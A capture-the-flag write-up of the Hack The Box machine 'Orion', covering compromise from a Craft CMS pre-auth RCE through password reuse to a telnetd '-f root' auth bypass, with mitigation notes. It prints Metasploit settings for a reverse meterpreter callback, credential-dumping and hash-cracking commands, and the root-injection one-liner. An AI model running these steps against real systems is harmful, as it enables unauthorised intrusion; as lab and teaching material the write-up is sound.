---
title: "Orion"
date: 2026-10-17
os: Linux
difficulty: Easy
platform: HTB
tags: [craftcms, cve-2025-32432, pre-auth-rce, bcrypt, password-reuse, telnet, inetutils, cve-2026-24061, argument-injection]
summary: "Pre-auth RCE in Craft CMS (CVE-2025-32432) for a foothold, DB creds from env leaking the admin bcrypt hash, SSH in via password reuse, and root through a GNU inetutils telnetd argument injection (CVE-2026-24061)."
---

[Orion](https://app.hackthebox.com/machines/Orion)

## Machine Information

| | |
|---|---|
| **Name** | Orion |
| **Difficulty** | Easy |
| **OS** | Linux |

This one chained a pre-auth RCE in Craft CMS (CVE-2025-32432) for the initial foothold, database credentials sitting in plain `env` output that led to the admin's bcrypt hash, a cracked password reused over SSH, and a root shell through an argument-injection bug in GNU inetutils' `telnetd` (CVE-2026-24061) that let `login` be told to authenticate as root with no password at all.

---

## Enumeration

Standard opener: a full TCP port sweep before anything else, so I don't waste time against a service I never actually confirmed was open.

```bash
nmap -p- --min-rate 5000 -Pn orion.htb
```

![[orion-01-nmap-allports.png]]

Followed by a version/script scan against whatever came back:

```bash
nmap -p<ports> -sCV orion.htb
```

![[orion-02-nmap-sCV.png]]

Port 80 was serving **Craft CMS**. I added `orion.htb` to `/etc/hosts` and started poking at the content with `ffuf`.

![[orion-03-ffuf.png]]

Two flags made this actually usable: `-ic` to ignore the wordlist's own comment lines (otherwise ffuf tries to request them as paths), and `-fs 12272` to filter out Craft/Yii's catch-all error page — every non-existent path on this app returns the same 12272-byte Yii exception page, and without filtering it out, that noise buries the real hits. With that out of the way, the admin panel at `/admin` showed up cleanly.

![[orion-04-craft-admin.png]]

---

## Foothold — Craft CMS pre-auth RCE (CVE-2025-32432)

The Craft version in use fell inside the affected range for CVE-2025-32432 (3.0.0-RC1–3.9.14, 4.0.0-RC1–4.14.14, 5.0.0-RC1–5.6.16) — a **pre-auth** remote code execution bug living in `/actions/assets/generate-transform`.

![[orion-05-craft-version.png]]

The chain behind it is two requests. First, a GET request poisons the server's own PHP session file by smuggling PHP code into it. Second, a POST request abuses Yii's dependency injection — specifically, tricking `craft\behaviors\FieldLayoutBehavior` into instantiating a `yii\rbac\PhpManager` with a crafted `itemFile` — to make the framework `require()` that poisoned session file, which executes the injected PHP.

The detail that actually matters for this box: Craft normally keeps PHP sessions wherever `session.save_path` points, and on this install that was **`/var/lib/php/sessions`**, not the usual `/tmp`. Metasploit's own module for this CVE fingerprints and prints that path on its own (`Leaked session.save_path: /var/lib/php/sessions`), so I didn't need to hunt for it manually — just confirm the module found it before firing.

I ran it through Metasploit:

```
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS http://orion.htb
set LHOST <tun0>
set LPORT 9001
set target 1
set payload cmd/linux/http/x64/meterpreter_reverse_tcp
run
```

![[orion-06-msf-exploit.png]]

The payload choice here is the part worth explaining, because the obvious default doesn't work. Metasploit's default payload for this exploit is a **staged** `php/meterpreter/reverse_tcp` — it runs inside the same short-lived PHP process that's handling the malicious HTTP request, and that process is killed by PHP-FPM as soon as the request finishes. The stager tries to pull down the next stage, the parent process dies mid-handshake, and you get stuck watching `core_loadlib` fail in a loop ("Died").

Setting `target 1` (Unix/Linux Command Shell) instead of the default PHP target, paired with a **stageless** native payload (`cmd/linux/http/x64/meterpreter_reverse_tcp`), sidesteps that entirely: the command-shell target just runs a shell command that downloads a self-contained Linux ELF meterpreter binary over HTTP and executes it as its **own independent process**, completely detached from the PHP worker that spawned it. By the time PHP-FPM kills the original request's process, the ELF is already running on its own and the session stays up.

![[orion-07-meterpreter-session.png]]

---

## From web shell to database credentials

With a stable shell, I checked the environment — self-hosted PHP apps configured through `.env` very often leak their secrets straight into the process environment.

```bash
env
```

![[orion-08-env-creds.png]]

`CRAFT_DB_USER` and `CRAFT_DB_PASSWORD` (`SuperSecureCraft123Pass!`) were sitting right there.

---

## Cracking the admin hash

With working DB credentials, I queried the `users` table directly:

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -e "USE orion; SELECT username,password FROM users"
```

![[orion-09-admin-hash.png]]

That returned the admin's password hash: `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS`. The `$2y$` prefix identifies it as bcrypt, `$13$` is the cost factor (2^13 key-derivation rounds), followed by a 22-character salt and then the hash itself.

Cracking it needed a bit of care on the shell side: bcrypt hashes are full of `$` characters, and an unquoted or double-quoted write to a file lets the shell try to expand those as variables — which silently empties out most of the hash and gets hashcat to reject it with a "Token length exception". Wrapping the hash in single quotes (or using `echo -n`) when writing it to the file avoids that entirely.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![[orion-10-hashcat-crack.png]]

Cracked to **`darkangel`**.

---

## User — SSH via password reuse

Same story as the DB credentials showing up in plain env — here the admin's own password turned out to be reused as their system login.

```bash
ssh adam@orion.htb
```

![[orion-11-ssh-user.png]]

`darkangel` worked, landing a stable shell and `user.txt`.

---

## Root — GNU inetutils telnetd argument injection (CVE-2026-24061)

Looking for anything listening only locally:

```bash
ss -tlnp
```

![[orion-12-ss-telnet.png]]

Telnet was listening on `127.0.0.1:23`, backed by GNU inetutils' `telnetd`.

That version is affected by CVE-2026-24061, an argument-injection bug: `telnetd` passes the username it receives straight through to `login` as a command-line argument, without sanitizing it. `login`'s own usage is `login [-p] [-h host] [-f name]`, and `-f name` means "force login as this user, no password required." If the "username" the client sends is actually `-f root` split across two separate argv entries, `login` doesn't see a username at all — it sees its own `-f root` flag and happily logs in as root with no password prompt.

The two separate-token part matters: typing `-froot` jammed together at the `login:` prompt does nothing (it's just an invalid username), and typing it interactively at the prompt doesn't reach `login` as an argument either — it has to be injected through the telnet client's own `-l` option, which is what actually gets forwarded to the server as the "username" argument list.

```bash
telnet -l '-f root' 127.0.0.1 23
```

![[orion-13-telnet-root.png]]

That dropped straight into a root shell with no password at all.

```bash
id
```

![[orion-14-id-root.png]]

Machine pwned.

![[orion-15-root-flag.png]]

---

## Flags

- **User:** `/home/adam/user.txt`, reached via the cracked admin password reused as `adam`'s SSH login.
- **Root:** `/root/root.txt`, reached via the telnetd argument-injection auth bypass.

---

## Lessons Learned / Mitigation

- **Craft CMS was exposed and unpatched against a pre-auth RCE.** CVE-2025-32432 needs no authentication at all — keeping CMS installations current isn't optional when the admin panel is internet-facing.
- **Database credentials were readable straight out of the process environment.** `.env`-style secrets end up in `env` dumps and process listings far more often than people expect; anything that touches the shell's environment should be treated as effectively world-readable to anyone who lands code execution.
- **The same password was reused across the application's admin account and the OS-level SSH account.** One cracked hash turned into a full user shell because of that reuse — application and system credentials should never share a value.
- **GNU inetutils `telnetd` passed client-supplied data straight to `login` as unsanitized arguments.** Any service that builds a command line for another program out of network input needs to treat that input as hostile — here it let a client silently inject `login`'s own `-f` flag and skip authentication entirely. Telnet's own long-standing weaknesses (cleartext, outdated auth model) make it a bad choice to expose at all, patched or not.
